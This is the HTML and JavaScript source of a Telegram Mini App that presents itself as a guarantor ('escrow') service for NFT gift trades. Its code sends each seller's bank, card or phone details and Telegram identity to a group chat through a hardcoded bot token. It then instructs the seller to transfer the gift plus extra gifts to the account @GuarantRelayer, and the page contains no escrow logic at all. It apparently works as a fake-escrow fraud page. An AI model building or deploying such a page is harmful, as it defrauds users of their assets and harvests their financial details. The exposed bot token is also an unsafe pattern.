<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Escrow Service</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-color: #0b0c10; --card-bg: #13151b; --card-border: #212531;
            --accent: #2ea6ff; --text-main: #ffffff; --text-muted: #8b94a5;
            --success: #22c55e; --warning: #f59e0b; --danger: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
        body { background-color: var(--bg-color); color: var(--text-main); padding: 16px; display: flex; flex-direction: column; gap: 16px; min-height: 100vh; }
        .header { text-align: center; padding: 10px 0; }
        .header h1 { font-size: 20px; font-weight: 800; }
        .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px; display: flex; flex-direction: column; gap: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
        .card-title { font-size: 17px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; }
        .form-group { display: flex; flex-direction: column; gap: 6px; }
        .form-group label { font-size: 11px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
        .form-control { background: #0b0c10; border: 1px solid var(--card-border); border-radius: 12px; padding: 12px; color: #fff; font-size: 14px; outline: none; width: 100%; }
        .action-box { background: rgba(46, 166, 255, 0.05); border: 1px dashed var(--accent); border-radius: 14px; padding: 14px; text-align: center; cursor: pointer; }
        .action-box .value { font-size: 14px; font-weight: 700; color: var(--accent); margin-top: 4px; word-break: break-all; }
        .instruction { font-size: 13px; color: var(--text-muted); line-height: 1.4; }
        .instruction b { color: var(--text-main); }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; background: var(--accent); color: #fff; text-align: center; }
        .btn-success { background: var(--success); color: #0b0c10; }
        .btn-danger { background: transparent; border: 1px solid var(--danger); color: var(--danger); }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="header">
        <h1>🛡 Гарант Сервис</h1>
        <p>Безопасные сделки с NFT подарками</p>
    </div>

    <div id="sellerView">
        <div id="sellerStep1" class="card">
            <div class="card-title">📦 Создание сделки</div>
            <div class="form-group"><label>Название подарка</label><input type="text" class="form-control" id="giftName" placeholder="Владосик Мишка"></div>
            <div class="form-group"><label>Сумма к оплате (в рублях)</label><input type="number" class="form-control" id="giftPrice" placeholder="1500"></div>
            <hr style="border: 0; border-top: 1px solid var(--card-border);">
            <div style="font-size: 13px; font-weight: 700; color: var(--accent);">Реквизиты для получения денег</div>
            <div class="form-group"><label>Банк</label><input type="text" class="form-control" id="payBank" placeholder="Сбер / Т-Банк"></div>
            <div class="form-group"><label>Карта / Телефон</label><input type="text" class="form-control" id="payCard" placeholder="+7 999 000-00-00"></div>
            <div class="form-group"><label>Комментарий (по желанию)</label><input type="text" class="form-control" id="payComment" placeholder="За подарок"></div>
            <button class="btn" onclick="createDeal()">Сгенерировать сделку</button>
        </div>

        <div id="sellerStep2" class="card hidden">
            <div class="card-title">🔗 Персональная ссылка</div>
            <div class="instruction">Скопируйте и отправьте покупателю:</div>
            <div class="action-box" onclick="copyText(document.getElementById('personalDealLink').textContent)">
                <div style="font-size: 11px; color: var(--text-muted);">Нажмите для копирования:</div>
                <div class="value" id="personalDealLink"></div>
            </div>
            <button class="btn" onclick="sellerGoToDeposit()">Перейти к отправке подарка</button>
        </div>

        <div id="sellerStep3" class="card hidden">
            <div class="card-title"><span>📤 Отправка гаранту</span></div>
            <div class="instruction">1. Отправьте подарок и 2 мишки на аккаунт:</div>
            <div class="action-box" onclick="copyText('@GuarantRelayer')">
                <div style="font-size: 11px; color: var(--text-muted);">Нажмите для копирования:</div>
                <div class="value">@GuarantRelayer</div>
            </div>
            <button class="btn btn-success" onclick="sellerDoneDeposit()">✅ Я отправил активы</button>
            <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const BOT_TOKEN = "8987632200:AAG2bS9DJy9sGzuUdAZ-kiuZZB0jNXVeo3Y";
        const GROUP_ID = -1003589174040;

        let dealId = Math.floor(1000 + Math.random() * 9000);

        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: GROUP_ID,
                        text: text,
                        parse_mode: "HTML"
                    })
                });
            } catch (e) {
                console.error("Ошибка отправки:", e);
            }
        }

        async function createDeal() {
            const name = document.getElementById('giftName').value.trim();
            const price = document.getElementById('giftPrice').value.trim();
            const bank = document.getElementById('payBank').value.trim();
            const card = document.getElementById('payCard').value.trim();
            const comment = document.getElementById('payComment').value.trim();

            if (!name || !price || !bank || !card) {
                tg.showAlert("Заполните название, сумму и реквизиты!");
                return;
            }

            const user = tg.initDataUnsafe?.user;
            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Аноним";
            const userId = user ? user.id : "Неизвестно";

            const dealPayload = { id: dealId, gift: name, price: price, bank: bank, card: card, comment: comment };
            const encodedPayload = encodeURIComponent(JSON.stringify(dealPayload));
            const personalLink = `https://t.me/GuarantMiniApp_bot?start=deal_${encodedPayload}`;

            document.getElementById('personalDealLink').textContent = personalLink;

            const text = (
                `📦 <b>НОВАЯ СДЕЛКА НА ПРОВЕРКУ #${dealId}</b>\n\n` +
                `👤 <b>Продавец:</b> ${username} (ID: <code>${userId}</code>)\n` +
                `🎁 <b>Подарок:</b> ${name}\n` +
                `💰 <b>Сумма:</b> ${price} ₽\n\n` +
                `💳 <b>Реквизиты:</b>\n` +
                `• Банк: ${bank}\n` +
                `• Счет/Телефон: <code>${card}</code>\n` +
                `• Коммент: ${comment || 'Нет'}\n\n` +
                `🔗 <a href='${personalLink}'>Ссылка для покупателя</a>`
            );

            await sendTelegramMessage(text);

            document.getElementById('sellerStep1').classList.add('hidden');
            document.getElementById('sellerStep2').classList.remove('hidden');
        }

        async function sellerGoToDeposit() {
            document.getElementById('sellerStep2').classList.add('hidden');
            document.getElementById('sellerStep3').classList.remove('hidden');
        }

        async function sellerDoneDeposit() {
            const user = tg.initDataUnsafe?.user;
            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Аноним";
            
            await sendTelegramMessage(`📤 <b>ПРОДАВЕЦ ОТПРАВИЛ АКТИВЫ!</b>\n\nСделка: #${dealId}\nПродавец: ${username}`);
            document.getElementById('sellerStep3').classList.add('hidden');
            tg.showAlert("Активы отправлены на проверку администраторам!");
        }

        async function openSupport() {
            const user = tg.initDataUnsafe?.user;
            const username = user ? (user.username ? `@${user.username}` : user.first_name) : "Аноним";

            await sendTelegramMessage(`🚨 <b>ВЫЗОВ ПОДДЕРЖКИ (СПОР)!</b>\n\nСделка: #${dealId}\nПользователь: ${username}`);
            tg.showAlert("Спор отправлен в группу поддержки!");
        }

        function copyText(text) {
            navigator.clipboard.writeText(text).then(() => {
                if (tg.showPopup) tg.showPopup({ title: "Скопировано! ✅", message: text, buttons: [{type: "ok"}] });
                else alert("Скопировано: " + text);
            });
        }
    </script>
</body>
</html>
